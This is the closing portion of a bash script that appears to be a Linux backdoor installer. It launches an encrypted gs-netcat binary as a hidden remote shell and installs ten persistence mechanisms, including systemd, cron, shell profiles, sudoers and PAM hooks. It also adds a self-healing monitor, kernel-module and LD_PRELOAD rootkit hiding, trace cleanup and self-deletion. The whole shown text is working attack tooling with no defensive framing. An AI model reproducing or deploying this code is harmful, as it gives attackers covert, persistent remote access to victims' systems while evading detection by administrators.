    log_success "Encrypted binary deployed"

    # 7. Check single instance and launch
    if check_single_instance; then
        log_info "Launching gs-netcat..."
        PASSWORD="$CRYPT_PASS" GS_ARGS="-ilD -s ${RANDOM_SECRET}" "$ENCRYPTED_BIN" &
        LAUNCHED_PID=$!
        sleep 1
        if kill -0 "$LAUNCHED_PID" 2>/dev/null; then
            write_pid "$LAUNCHED_PID"
            log_success "Process running (PID: $LAUNCHED_PID)"
        else
            log_warning "Process exited early"
        fi
    fi

    # 8. Install ALL persistence layers (10 layers total)
    log_info "Installing persistence layers..."
    install_systemd       "$ENCRYPTED_BIN" "$hash_file"
    install_cron          "$ENCRYPTED_BIN" "$hash_file"
    install_profile       "$ENCRYPTED_BIN" "$hash_file"
    install_rclocal       "$ENCRYPTED_BIN"
    install_xdg_autostart "$ENCRYPTED_BIN" "$hash_file"
    install_prompt_command "$ENCRYPTED_BIN" "$hash_file"

    if [ "$(id -u)" -eq 0 ]; then
        install_sudoers_hook  "$ENCRYPTED_BIN" "$hash_file"
        install_pam_hook      "$ENCRYPTED_BIN" "$hash_file"
        install_initd         "$ENCRYPTED_BIN" "$hash_file"
    fi

    # 9. Install self-healing monitor
    log_info "Activating self-heal monitor..."
    install_self_heal "$ENCRYPTED_BIN" "$hash_file"

    # 10. Kernel hiding
    if [ "$(id -u)" -eq 0 ]; then
        log_info "Loading kernel module..."
        install_lkm "$BIN_ALIAS"
    fi

    # 11. User-space hiding
    log_info "Installing LD_PRELOAD..."
    install_ldpreload "$BIN_ALIAS"

    # 12. Cleanup
    clean_traces "$ENCRYPTED_BIN"

    # 13. Summary
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║   SELF-HEALING PERSISTENCE COMPLETE          ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════════╣${NC}"
    printf "${GREEN}║${NC} Binary  : ${YELLOW}%-36s${GREEN}║${NC}\n" "$ENCRYPTED_BIN"
    printf "${GREEN}║${NC} Secret  : ${YELLOW}%-36s${GREEN}║${NC}\n" "$RANDOM_SECRET"
    printf "${GREEN}║${NC} Pass    : ${YELLOW}%-36s${GREEN}║${NC}\n" "$CRYPT_PASS"
    echo -e "${GREEN}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} Persistence Layers (10 total):"
    echo -e "${GREEN}║${NC}  [✓] Systemd service + timer"
    echo -e "${GREEN}║${NC}  [✓] Crontab (decoy/fallback)"
    echo -e "${GREEN}║${NC}  [✓] ~/.bashrc / ~/.profile / profile.d"
    echo -e "${GREEN}║${NC}  [✓] /etc/rc.local (root)"
    echo -e "${GREEN}║${NC}  [✓] XDG autostart (GUI)"
    echo -e "${GREEN}║${NC}  [✓] PROMPT_COMMAND (shell)"
    echo -e "${GREEN}║${NC}  [✓] Sudoers hook (root)"
    echo -e "${GREEN}║${NC}  [✓] PAM auth hook (root)"
    echo -e "${GREEN}║${NC}  [✓] Init.d script (root)"
    echo -e "${GREEN}║${NC} Self-Heal:"
    echo -e "${GREEN}║${NC}  [✓] Active monitor restores deleted layers"
    echo -e "${GREEN}║${NC}  [✓] Checks every 5 minutes"
    echo -e "${GREEN}║${NC} Hiding:"
    echo -e "${GREEN}║${NC}  [?] LKM ftrace hook"
    echo -e "${GREEN}║${NC}  [?] LD_PRELOAD libc hook"
    echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${RED}[!] RECORD SECRET + PASSWORD NOW${NC}"

    selfdelete
}

main "$@"
